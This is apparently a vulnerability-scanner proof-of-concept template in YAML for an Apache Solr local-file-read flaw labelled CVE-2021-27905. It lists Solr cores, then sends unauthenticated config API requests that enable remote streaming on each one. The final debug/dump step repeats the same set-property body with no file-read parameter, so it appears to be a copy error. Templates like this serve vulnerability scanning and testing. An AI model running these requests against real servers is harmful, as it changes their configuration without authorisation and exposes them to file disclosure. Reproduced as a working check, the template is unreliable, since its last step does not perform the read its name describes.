name: poc-yaml-Solr-LFI-CVE-2021-27905
rules:
  - method: GET
    path: "/solr/admin/cores?indexInfo=false&wt=json"
    expression: "true"
    search: |
      "name":"(?P<name>.+?)"
  - method: POST
    path: "/solr/{{name}}/config"
    headers:
      Content-Type: application/json
      Accept: application/json
    body: |
      {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
    expression: |
      response.status == 200 && response.body.bcontains(b'responseHeader') 
  - method: POST
    path: "/solr/{{name}}/debug/dump"
    headers:
      Content-Type: application/json
      Accept: application/json
    body: |
      {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
    expression: |
      response.status == 200 &&  response.body.bcontains(b'responseHeader')
